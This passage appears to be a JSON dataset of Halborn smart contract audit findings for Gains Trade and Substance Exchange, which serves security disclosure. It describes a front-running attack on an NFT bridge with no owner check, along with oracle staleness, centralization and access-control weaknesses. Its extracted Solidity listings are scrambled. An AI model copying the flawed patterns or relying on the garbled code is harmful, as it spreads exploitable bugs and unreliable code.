        "body": "In the NFTMintingBridge contract, the function bridgeNft() is used to bridge ERC721 tokens from one chain to another: Listing 1: NFTMintingBridge.sol (Line 89) */ external payable whenNotPaused require ( msg . value != 0 , \" ! fee \" ); // Make sure a native fee is The ** LayerZero ** destination chain ID . The tokenId of the NFT * bridgeNft * @param dstChainId * @param tokenId * * Burns the NFT with ID < tokenID >. A cross - chain message is then 74 /* * 75 76 77 78 79  sent to our counterpart on the destination chain to mint / release  this NFT . 80 81 function bridgeNft ( uint16 dstChainId , uint256 tokenId ) 82 83 84 85 { 86  supplied for the cross - chain message . 87 88  approved by the token owner nft . burn ( tokenId ); 89 90 91  tokenId ); 92 93 94 95 96 97  refund any extra gas back to caller 98 99 dstChainId , // destination chainId payloadBytes , // abi . encode () 'ed bytes payable ( msg . sender ) , // refund address ( LayerZero will // send LayerZero message _lzSend ( bytes memory payloadBytes = _buildReleaseMesssage ( msg . sender , address (0 x0 ) , // unused bytes ( \" \") , // unused // Burn the NFT - This will only work if the bridge was 14 100 101 102 103 104 } msg . value // native fee amount ); emit NftBurnReceived ( dstChainId , msg . sender , tokenId ); The function burns the tokenId passed as parameter, but it does not check that the caller of the function actually owns that NFT. This opens up the following attack vector: Bob is a malicious user who is monitoring the mempool for any 1. Alice owns NFT #1337. 2. Alice approves the NFTMintingBridge so then she can call bridgeNft() to bridge the NFT to a different chain. 3. Alice calls NFTMintingBridge.bridgeNft(2, 1337). 4. NFTMintingBridge.bridgeNft() calls. 5. paying a higher gas fee. NFTMintingBridge.bridgeNft(2, 1337). 6. reverts as the token was already burnt by Bob. 7. Bob gets the NFT minted in the new chain. Bob detects Alices call and front-runs her transaction by Bobs transaction is identical to Alices, Bobs transaction is mined before Alices. Alices transaction Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to add the following require check in the bridgeNft() function: Listing 2: NFTMintingBridge.sol (Line 87) 74 /* * 75 * bridgeNft 15 */ external payable whenNotPaused require ( msg . value != 0 , \" ! fee \" ); // Make sure a native fee is The ** LayerZero ** destination chain ID . The tokenId of the NFT require ( nft . ownerOf ( tokenId ) == msg . sender , \"! owner \" ); // Burn the NFT - This will only work if the bridge was * @param dstChainId * @param tokenId * * Burns the NFT with ID < tokenID >. A cross - chain message is then 76 77 78 79  sent to our counterpart on the destination chain to mint / release  this NFT . 80 81 function bridgeNft ( uint16 dstChainId , uint256 tokenId ) 82 83 84 85 { 86  supplied for the cross - chain message . 87 88  approved by the token owner 89 nft . burn ( tokenId ); 90 91  tokenId ); 92 93 94 95 96 97  refund any extra gas back to caller 98 99 100 101 102 103 104 } dstChainId , // destination chainId payloadBytes , // abi . encode () 'ed bytes payable ( msg . sender ) , // refund address ( LayerZero will address (0 x0 ) , // unused bytes ( \" \") , // unused msg . value // native fee amount // send LayerZero message _lzSend ( bytes memory payloadBytes = _buildReleaseMesssage ( msg . sender , emit NftBurnReceived ( dstChainId , msg . sender , tokenId ); ); Remediation Plan: SOLVED: The Gains Trade team solved the issue in the Commit ID: a349e7438543d57b5845a6771d4e642a1a4868f4 16 Listing 3: NFTMintingBridge.sol (Line 89) */ external payable whenNotPaused The ** LayerZero ** destination chain ID . The tokenId of the NFT * bridgeNft * @param dstChainId * @param tokenId * * Burns the NFT with ID < tokenID >. A cross - chain message is then 76 /* * 77 78 79 80 81  sent to our counterpart on the destination chain to mint / release  this NFT . 82 83 function bridgeNft ( uint16 dstChainId , uint256 tokenId ) 84 85 86 87 { 88  supplied for the cross - chain message . 89 90 91  approved by the token owner nft . burn ( tokenId ); 92 93 94  tokenId ); 95 96 97 98 99 100 dstChainId , // destination chainId payloadBytes , // abi . encode () 'ed bytes payable ( msg . sender ) , // refund address ( LayerZero will // send LayerZero message _lzSend ( require ( msg . value != 0 , \" ! fee \" ); // Make sure a native fee is bytes memory payloadBytes = _buildReleaseMesssage ( msg . sender , // Burn the NFT - This will only work if the bridge was require ( nft . ownerOf ( tokenId ) == msg . sender , \" ! owner \" );  refund any extra gas back to caller 101 102 103 104 105 106 107 } address (0 x0 ) , // unused bytes ( \" \") , // unused msg . value // native fee amount ); emit NftBurnReceived ( dstChainId , msg . sender , tokenId ); 17 ",
        "labels": [
            "Halborn",
            "Gains_Trade",
            "Severity: Critical"
        ]
    },
    {
        "title": "WRONG FEE SENT TO CHAINLINK NODES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the GTokenOpenPnlFeed contract, the makeOpenPnlRequest() function is used to send requests to a pool of Chainlink oracles: Listing 4: GTokenOpenPnlFeed.sol (Lines 251-254) Chainlink . Request memory linkRequest = buildChainlinkRequest ( uint linkFeePerNode = IERC20 ( chainlinkTokenAddress () ) requests [++ lastRequestId ] = Request ({ ); job , address ( this ) , this . fulfill . selector . balanceOf ( address ( this )) / LINK_FEE_BALANCE_DIVIDER / oracles . length ; 243 // Create requests 244 function makeOpenPnlRequest () private { 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 initiated : true , active : true , linkFeePerNode : linkFeePerNode emit NextEpochValueRequested ( gToken . currentEpoch () , oracles [ i], linkRequest , linkFeePerNode )] = lastRequestId ; }) ; } for ( uint i ; i < oracles . length ; i ++) { requestIds [ sendChainlinkRequestTo ( nextEpochValuesRequestCount ++; nextEpochValuesLastRequest = block . timestamp ; 18 lastRequestId , job , oracles . length , linkFeePerNode 275 276 277 278 279 280 } ); The linkFeePerNode variable is wrongly calculated, as it depends on the contracts balance. If the Link balance of the GTokenOpenPnlFeed contract is too high, more Link than needed would be sent to the Chainlink oracles as fees. In case that the Link balance of the GTokenOpenPnlFeed contract is not high enough, the contract will not send enough Link to the Chainlink oracles and the transactions will revert. Risk Level: Likelihood - 5 Impact - 1 Recommendation: It is recommended to set a fixed Link fee based on the blockchain and the type of Chainlink oracle used. This Link fee is usually 0.1 Link: 19 Remediation Plan: RISK ACCEPTED: The Gains Trade team accepted the risk and stated: We will send enough to the contract so that divided by 1000 it represents the amount we want, and then we will refill it every few months. This pattern allows everyone to send a link to the contract in a decentralized manner. It also means the transaction can never revert, unlike what the issue says because it can never run out of LINK. 20 ",
        "labels": [
            "Halborn",
            "Gains_Trade",
            "Severity: Medium"
        ]
    },
    {
        "title": "THE TRANSFEROWNERSHIP PATTERN IS NOT FOLLOWED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The current ownership transfer process for the GToken contract inheriting from Ownable involves the current owner/timelock contract, calling the transferOwnership function. If the nominated account is not a valid account, it is entirely possible that the owner may accidentally transfer ownership to an uncontrolled account, losing the access to all functions with the onlyOwner modifier. Risk Level: Likelihood - 1 Impact - 2 Recommendation: It is recommended to implement a two-step process where the owner/timelock contract nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of the ownership to fully succeed. This ensures the nominated account is valid and active. Remediation Plan: RISK ACCEPTED: The Gains Trade team accepted the risk of this finding. 21 ",
        "labels": [
            "Halborn",
            "Gains_Trade",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Contracts in-scope are missing address validation in some functions. It is possible to configure the zero address, which may cause issues during the contract execution. Code Location: The following function is not validating, that the given addresses in the newValues array are different from zero: Listing 5: GTokenOpenPnlFeed.sol 173 function updateOracles ( address [] memory newValues ) external  onlyOwner { 174  ; 175 176 177 178 } require ( newValues . length >= minAnswers , \" ARRAY_TOO_SMALL \" ) oracles = newValues ; emit OraclesUpdated ( newValues ); The constructor is not validating that the address of the _token argument is different from zero: Listing 6: TWAPPriceGetter.sol constructor ( IUniswapV3Pool _pool , address _token , uint32 require ( address ( _pool ) != address (0) && _twapInterval > 0 16  _twapInterval , uint _precision ){ 17  && _precision > 0, \" WRONG_TWAP_CONSTRUCTOR \" ); 18 19 20 21 22 pool = _pool ; twapInterval = _twapInterval ; precision = _precision ; 22 23 24 } isGnsToken0InLp = pool . token0 () == _token ; Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider adding a check to see if the address is different from the zero address. Remediation Plan: RISK ACCEPTED: The Gains Trade team accepted the risk of this finding. 23 ",
        "labels": [
            "Halborn",
            "Gains_Trade",
            "Severity: Low"
        ]
    },
    {
        "title": "GAS OVER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In all the loops, the counter variable is incremented using i++. loops, using ++i costs less gas per iteration than i++. In Code Location: GTokenOpenPnlFeed.sol - Line 197: for(uint i = 0; i < reqToResetCount; i++) - Line 248: for(uint i = 0; i < oracles.length; i ++) - Line 368: for(uint i = 0; i < array.length; i++) Proof of Concept: For example, based in the following test contract: Listing 7: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 4 contract test { 5 6 7 8 9 10 11 12 13 } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } The difference in the gas costs: 24 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use pre-incrementation instead of post-incrementation to update the value of an uint variable inside a loop to save some gas. This is not applicable outside of loops. Remediation Plan: ACKNOWLEDGED: The Gains Trade team acknowledged this finding. 25 ",
        "labels": [
            "Halborn",
            "Gains_Trade",
            "Severity: Informational"
        ]
    },
    {
        "title": "REDUNDANT INITIALIZATION OF UINT VARIABLES TO 0",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "As the variable is a uint, it is already initialized to 0. For example, uint256 i = 0 reassigns the 0 to i, which wastes gas. Code Location: GTokenOpenPnlFeed.sol - Line 197: for(uint i = 0; i < reqToResetCount; i++) - Line 248: for(uint i = 0; i < oracles.length; i ++ - Line 368: for(uint i = 0; i < array.length; i++) Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to not initialize uint variables to 0 to save some gas. For example, use instead: for (uint i; i < nodes.length; ++i). Remediation Plan: SOLVED: The Gains Trade team solved the issue by reducing the gas costs in the Commit ID: f1bcbb4da9efdd8a8be2d28a297cfc9b999d2e1a 26 ",
        "labels": [
            "Halborn",
            "Gains_Trade",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE OF REVERT STRINGS INSTEAD OF CUSTOM ERRORS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Failed operations in the smart contracts in scope are reverted with accompanying messages selected from a set of hard-coded strings. In the EVM, emitting a hard-coded string in an error message costs ~50 more gas than emitting a custom error. Additionally, hard-coded strings increase the gas required to deploy the contract. Code Location: GToken.sol - Line 182: require(_contractAddresses.asset != address(0)... - Line 231: require(_msgSender()== manager, \"ONLY_MANAGER\"); - Line 236: require(shareToAssetsPrice > 0, \"PRICE_0\"); - Line 237: require(assetsOrShares > 0, \"VALUE_0\"); - Line 242: require(maxDiscountP > 0, \"NO_ACTIVE_DISCOUNT\"); - Line 243: require(lockDuration >= MIN_LOCK_DURATION, \"BELOW_MIN_LOCK_DURATION\"); - Line 244: require(lockDuration <= MAX_LOCK_DURATION, \"ABOVE_MAX_LOCK_DURATION\"); - Line 250: require(newOwner != address(0), \"Ownable: new owner is the zero address \"); - Line 251: require(newOwner != manager && newOwner != admin, \"WRONG_VALUE\"); 27 - Line 256: require(newValue != address(0), \"ADDRESS_0\"); - Line 257: require(newValue != owner()&& newValue != admin, \"WRONG_VALUE\"); - Line 263: require(newValue != address(0), \"ADDRESS_0\"); - Line 264: require(newValue != owner()&& newValue != manager, \"WRONG_VALUE\"); - Line 270: require(newValue != address(0), \"ADDRESS_0\"); - Line 276: require(newValue.addr != address(0), \"ADDRESS_0\"); - Line 277: require(newValue.signature.length > 0, \"BYTES_0\"); - Line 283: require(newValue != address(0), \"ADDRESS_0\"); - Line 295: require(newValue >= MIN_DAILY_ACC_PNL_DELTA, \"BELOW_MIN\"); - Line 301: require(newValue[1] > newValue[0], \"WRONG_VALUES\"); - Line 307: require(newValue <= MAX_SUPPLY_INCREASE_DAILY_P, \"ABOVE_MAX\"); - Line 313: require(newValue <= MAX_LOSSES_BURN_P, \"ABOVE_MAX\"); - Line 319: require(newValue <= MAX_GNS_SUPPLY_MINT_DAILY_P, \"ABOVE_MAX\"); - Line 325: require(newValue <= MAX_DISCOUNT_P, \"ABOVE_MAX_DISCOUNT\"); - Line 331: require(newValue >= 100 * PRECISION, \"BELOW_MIN\"); - Line 348: require(success == true, \"GNS_PRICE_CALL_FAILED\"); - Line 351: require(price > 0, \"GNS_TOKEN_PRICE_0\"); - Line 433: require(totalSharesBeingWithdrawn(sender)<= balanceOf(sender)- amount, \"PENDING_WITHDRAWAL\"); 28 - Line 443: require(totalSharesBeingWithdrawn(from)<= balanceOf(from)- amount, \" PENDING_WITHDRAWAL\"); - Line 499: require(assets <= maxDeposit(receiver), \"ERC4626: deposit more than max \"); - Line 512: require(shares <= maxMint(receiver), \"ERC4626: mint more than max\"); - Line 526: require(assets <= maxWithdraw(owner), \"ERC4626: withdraw more than max \"); - Line 542: require(shares <= maxRedeem(owner), \"ERC4626: redeem more than max\"); - Line 578: require(openTradesPnlFeed.nextEpochValuesRequestCount()== 0, \" END_OF_EPOCH\"); - Line 582: require(sender == owner || allowance > 0 && allowance >= shares, \" NOT_ALLOWED\"); - Line 584: require(totalSharesBeingWithdrawn(owner)+ shares <= balanceOf(owner), \" MORE_THAN_BALANCE\"); - Line 593: require(shares <= withdrawRequests[owner][unlockEpoch], \"MORE_THAN_WITHDRAW_AMOUNT \"); - Line 597: require(sender == owner || allowance > 0 && allowance >= shares, \" NOT_ALLOWED\"); - Line 614: require(simulatedAssets <= maxDeposit(receiver), \"DEPOSIT_MORE_THAN_MAX \"); - Line 630: require(shares <= maxMint(receiver), \"MINT_MORE_THAN_MAX\"); - Line 651: require(assets > assetsDeposited, \"NO_DISCOUNT\"); - Line 683: require(owner == sender... 29 - Line 686: require(block.timestamp >= d.atTimestamp + d.lockDuration, \" NOT_UNLOCKED\"); - Line 695: require(accPnlPerToken <= int(PRECISION), \"NOT_ENOUGH_ASSETS\"); - Line 725: require(sender == pnlHandler, \"ONLY_TRADING_PNL_HANDLER\"); - Line 734: require(accPnlPerToken <= int(PRECISION), \"NOT_ENOUGH_ASSETS\"); - Line 738: require(dailyAccPnlDelta <= int(maxDailyAccPnlDelta), \"MAX_DAILY_PNL\"); - Line 780: require(assets <= assetsToDeplete, \"AMOUNT_TOO_BIG\"); - Line 801: require(accPnlPerTokenUsed > 0, \"NOT_UNDER_COLLATERALIZED\"); - Line 804: require(assets <= uint(accPnlPerTokenUsed)* supply / PRECISION, \" AMOUNT_TOO_BIG\"); - Line 814: require(dailyMintedGns <= maxGnsSupplyMintDailyP... - Line 839: require(sender == address(openTradesPnlFeed), \"ONLY_PNL_FEED\"); GTokenOpenPnlFeed.sol - Line 104: require(_linkToken != address(0) - Line 122: require(msg.sender == IOwnable(address(gToken)).owner(), \"ONLY_OWNER\"); - Line 127: require(msg.sender == gToken.manager(), \"ONLY_MANAGER\"); - Line 132: require(msg.sender == gToken.admin(), \"ONLY_ADMIN\"); - Line 138: require(newValue >= MIN_REQUESTS_START, \"BELOW_MIN\"); - Line 139: require(newValue <= MAX_REQUESTS_START, \"ABOVE_MAX\"); - Line 145: require(newValue >= MIN_REQUESTS_EVERY, \"BELOW_MIN\"); 30 - Line 146: require(newValue <= MAX_REQUESTS_EVERY, \"ABOVE_MAX\"); - Line 152: require(newValue >= MIN_REQUESTS_COUNT, \"BELOW_MIN\"); - Line 153: require(newValue <= MAX_REQUESTS_COUNT, \"ABOVE_MAX\"); - Line 169: require(newValue >= MIN_ANSWERS, \"BELOW_MIN\"); - Line 170: require(newValue % 2 == 1, \"EVEN\"); - Line 171: require(newValue <= oracles.length / 2, \"ABOVE_MAX\"); - Line 177: require(_index < oracles.length, \"INDEX_TOO_BIG\"); - Line 178: require(newValue != address(0), \"VALUE_0\"); - Line 184: require(newValues.length >= minAnswers * 2, \"ARRAY_TOO_SMALL\"); - Line 190: require(newValue != bytes32(0), \"VALUE_0\"); - Line 198: require(reqToResetCount > 0, \"NO_REQUEST_TO_RESET\"); - Line 218: require(block.timestamp - gToken.currentEpochStart() TWAPPriceGetter.sol - Line 34: require(address(_uniV3Pool)!= address(0)... - Line 49: require(address(_uniV3Pool)!= address(0), \"WRONG_VALUE\"); - Line 56: require(_twapInterval >= MIN_TWAP_PERIOD && _twapInterval <= MAX_TWAP_PERIOD, \"WRONG_VALUE\"); GNSTokenBridge.sol - Line 104: require(msg.value != 0, \"!fee\"); 31 NFTMintingBridge.sol - Line 86: require(msg.value != 0, \"!fee\"); Risk Level: Likelihood - 1 Impact - 1 Recommendation: Custom errors are available since Solidity 0.8.4 version. Consider re- placing all the revert strings with custom errors. Remediation Plan: ACKNOWLEDGED: The Gains Trade team acknowledged this finding. 32 ",
        "labels": [
            "Halborn",
            "Gains_Trade",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING/INCOMPLETE NATSPEC COMMENTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was identified that the contracts are missing or have incomplete code documentation, which affects the understandability, auditability, and usability of the code. Solidity contracts can use a special form of comments to provide rich doc- umentation for functions, return variables, and more. This special form is named the Ethereum Natural Language Specification Format (*NatSpec**). Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider adding full NatSpec comments so that all functions have full code documentation for future use. Remediation Plan: ACKNOWLEDGED: The Gains Trade team acknowledged this finding. 33 ",
        "labels": [
            "Halborn",
            "Gains_Trade",
            "Severity: Informational"
        ]
    },
    {
        "title": "CHAINLINK LATESTROUNDDATA MIGHT BE STALE OR INCORRECT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "Substance Exchange uses Chainlink as its price oracle. When buying or selling sUSD, the SubstanceUSD contract queries Chainlink for the underlying token price using the latestRoundData() function. This func- tion returns uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt and uint80 answeredInRound. roundId denotes the identifier of the most recent update round, answer is the price of the asset, startedAt is the timestamp at which the round started and updatedAt is the times- The getPrice() function does not tamp at which the feed was updated. check if the feed was updated at the most recent round nor does it verify the update timestamp against the current time, and this can result in accepting stale data which may threaten the stability of the exchange in a volatile market. Code Location: SubstanceUSD.sol#L92 Listing 1: SubstanceUSD.sol (Line 92) function getPrice ( address token , bool min ) public view returns 87  ( uint256 price ) { 88 89 90 91 92  oracle ). latestRoundData () ; 93 94 95 96  ; address oracle = underlyingToken [ token ]. oracle ; if ( oracle == address (0) ) { revert SubstanceUSD__InvalidToken () ; } (, int256 oraclePrice , , , ) = AggregatorV3Interface ( if ( oraclePrice <= 0) { revert SubstanceUSD__InvalidOraclePrice () ; } uint8 pDecimals = AggregatorV3Interface ( oracle ). decimals () 21 price = ( uint256 ( oraclePrice ) * PRECISION ) / (10** price = min ? Math . min ( PRECISION , price ) : Math . max ( 97  pDecimals ); 98  PRECISION , price ); 99 } BVSS: AO:A/AC:L/AX:M/C:N/I:N/A:C/D:N/Y:N/R:N/S:U (6.7) Recommendation: It is recommended to establish confidence intervals for the roundId and updatedAt parameters and reject any Chainlink data feed response which falls outside those ranges. Reference: For further details, see Chainlinks latestRoundData might return stale or incorrect results Remediation Plan:: SOLVED: The Substance Exchange team solved this issue in commit 7717277a. 22 ",
        "labels": [
            "Halborn",
            "Substance_Exchange_Exchange_V1",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING CHAINLINK ARBITRUM SEQUENCER HEALTH CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "Arbitrum is a L2 blockchain leveraging Optimistic Rollups to integrate with the underlying L1. A node called sequencer is tasked with submitting user transactions to the L1 and if it fails, communication between the two is impossible. The exchange does not verify if the sequencer is online, which may lead to unexpected behavior if submitting transactions to the Ethereum mainnet is blocked. Code Location: SubstanceUSD.sol#L92 Listing 2: SubstanceUSD.sol (Line 92) function getPrice ( address token , bool min ) public view returns 87  ( uint256 price ) { 88 89 90 91 92  oracle ). latestRoundData () ; 93 94 95 96  ; 97  pDecimals ); 98  PRECISION , price ); 99 } address oracle = underlyingToken [ token ]. oracle ; if ( oracle == address (0) ) { revert SubstanceUSD__InvalidToken () ; } (, int256 oraclePrice , , , ) = AggregatorV3Interface ( if ( oraclePrice <= 0) { revert SubstanceUSD__InvalidOraclePrice () ; } uint8 pDecimals = AggregatorV3Interface ( oracle ). decimals () price = ( uint256 ( oraclePrice ) * PRECISION ) / (10** price = min ? Math . min ( PRECISION , price ) : Math . max ( 23 BVSS: AO:A/AC:L/AX:M/C:N/I:N/A:C/D:N/Y:N/R:N/S:U (6.7) Recommendation: It is recommended to verify the status of the Arbitrum sequencer before updating the contract state. References: Chainlink L2 Sequencer Uptime Feeds Remediation Plan: RISK ACCEPTED: The Substance Exchange team accepted the risk of this issue. 24 ",
        "labels": [
            "Halborn",
            "Substance_Exchange_Exchange_V1",
            "Severity: Medium"
        ]
    },
    {
        "title": "USING TRANSFER INSTEAD OF SAFETRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "Using transfer() instead of safeTransfer() when interacting with ERC20 tokens is not recommended because transfer() does not provide the same level of error handling and safety measures. Code Location: The following contracts use transfer() function: - ExchangeManager.sol - LiquidityPool.sol - SubstanceUSD.sol - UserBalance.sol - BaseFuture.sol - FutureManager.sol - Option.sol - OptionManager.sol - SwapManager.sol - StakingReward.sol BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:N/D:L/Y:N/R:N/S:U (3.1) Recommendation: It is recommended to use the SafeERC20 contract and the safeTransfer() function for token transfers. 25 Remediation Plan: RISK ACCEPTED: The Substance Exchange team accepted the risk of this issue. 26 ",
        "labels": [
            "Halborn",
            "Substance_Exchange_Exchange_V1",
            "Severity: Low"
        ]
    },
    {
        "title": "FEEONTRANSFER AND BURNONTRANSFER TOKENS ARE NOT SUPPORTED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "Whenever a transfer of tokens is executed (in a swap, a deposit, or while adding liquidity), theres no check if the amount sent is equal to the amount actually received by the contract. The safeTransferFrom function calls transferFrom internally in the token contract to execute the transfer. However, the balance is not verified before and after the transfer and the actual amount transferred may not be the same as the amount received in the case of a fee applied in the token contract. In the case of using a token of this kind, the liquidity providers may not be able to withdraw all of their liquidity. Code Location: UserBalance.sol#L78 Listing 3: UserBalance.sol (Line 82) function userDeposit ( address _token , uint256 _amount ) external 78  { 79 80 81  _amount ); 82 83 84 } _validTokenAddress ( _token ); address user = msgSender () ; IERC20 ( _token ). safeTransferFrom ( user , address ( this ) , userBalance [ user ][ _token ] += _amount ; emit Deposit ( user , _token , _amount ); BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:M/Y:N/R:P/S:U (3.1) 27 Recommendation: It is recommended to check the balance before and after the transfer to be sure the amount added to the user balance is actually the amount received by the protocol. Listing 4: UserBalance.sol (Line 82) function userDeposit ( address _token , uint256 _amount ) external 78  { 79 80 81 82  _amount ); 83 84 85 86 } _validTokenAddress ( _token ); address user = msgSender () ; uint256 balanceBefore ; = IERC20 ( _token ). balanceOf ( this ); IERC20 ( _token ). safeTransferFrom ( user , address ( this ) , _amount = IERC20 ( _token ). balanceOf ( this ) - balanceBefore ; userBalance [ user ][ _token ] += _amount ; emit Deposit ( user , _token , _amount ); Remediation Plan: RISK ACCEPTED: The Substance Exchange team accepted the risk of this issue. 28 ",
        "labels": [
            "Halborn",
            "Substance_Exchange_Exchange_V1",
            "Severity: Low"
        ]
    },
    {
        "title": "CENTRALIZATION RISK: PRODUCT MANAGER CAN WITHDRAW ARBITRARY AMOUNTS FROM LIQUIDITY POOLS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The LiquidityPool contract implements the external transfer function, which allows any account with the ProductManger role to withdraw arbitrary amounts of tokens from existing liquidity pools. In case such an account is compromised, the entire protocol liquidity is at risk. Code Location: LiquidityPool.sol#L499 Listing 5: LiquidityPool.sol (Line 501) 499 function transfer ( address _token , address _dist , uint256  _amount ) external isProductManager { poolAmount [ _token ] -= _amount ; IERC20 ( _token ). transfer ( _dist , _amount ); 500 501 502 } BVSS: AO:S/AC:L/AX:L/C:N/I:C/A:N/D:C/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to reconsider the need for the transfer function and, if deemed necessary for the operations of the protocol, implement a decen- tralized solution like a multi-signature wallet to govern the exchange. 29 Remediation Plan: RISK ACCEPTED: The Substance Exchange team accepted the risk of this issue. 30 ",
        "labels": [
            "Halborn",
            "Substance_Exchange_Exchange_V1",
            "Severity: Low"
        ]
    },
    {
        "title": "CENTRALIZATION RISK: PRODUCT MANAGER CAN ALTER TOKEN RESERVES INDICATORS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "the contract LiquidityPool increaseLiquidity() The and implements decreaseLiquidity() functions. If called by the Product Manager (which is a role assigned by the contract owner) they can alter the values reported by the token reserves trackers without actually touching the This directly affects reserves, putting the exchange out of balance. protocol accounting and may have negative consequences on the protocol and its users. A good example of this could be a liquidity provider withdrawing their liquidity from the pool, where the transaction would revert. Code Location: LiquidityPool.sol#L489 Listing 6: LiquidityPool.sol (Line 491) 489 function increaseLiquidity ( address _token , uint256 _amount )  external isProductManager { 490 491 492 } _validTokenCheck ( _token ); poolAmount [ _token ] += _amount ; LiquidityPool.sol#L494 Listing 7: LiquidityPool.sol (Line 496) 494 function decreaseLiquidity ( address _token , uint256 _amount )  external isProductManager { 495 496 _validTokenCheck ( _token ); poolAmount [ _token ] -= _amount ; 31 497 } BVSS: AO:S/AC:L/AX:L/C:N/I:C/A:N/D:C/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to reconsider the need for this function, and if deemed necessary force the execution of token transfers for the reserves to reflect the reported balances. Remediation Plan: RISK ACCEPTED: The Substance Exchange team accepted the risk of this issue. 32 ",
        "labels": [
            "Halborn",
            "Substance_Exchange_Exchange_V1",
            "Severity: Low"
        ]
    },
    {
        "title": "POTENTIAL ACCESS CONTROL BYPASS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The ProductManager role is used to grant access from some contracts to other contracts functions. There exists a scenario in which any user can be the owner of the entire protocol by means of using the hub contract's delegate calls to call any other protocol contract if the Delegation Hub contract is assigned the ProductManager role for those other contracts, effectively granting anyone privileged access to many sensitive functions. Code Location: Listing 8: OwnableUpgradeable.sol function transferOwnership ( address newOwner ) public virtual 74  onlyOwner { 75  zero address \" ); 76 77 } require ( newOwner != address (0) , \" Ownable : new owner is the _transferOwnership ( newOwner ); BVSS: AO:S/AC:L/AX:L/C:N/I:C/A:N/D:C/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to add a requirement that the Hub contract cannot be assigned the ProductManager role. 33 Remediation Plan: RISK ACCEPTED: The Substance Exchange team accepted the risk of this issue. 34 ",
        "labels": [
            "Halborn",
            "Substance_Exchange_Exchange_V1",
            "Severity: Low"
        ]
    },
    {
        "title": "USING ERC721A INSTEAD OF ERC721 FOR MINTING ONLY 1 NFT AT A TIME",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
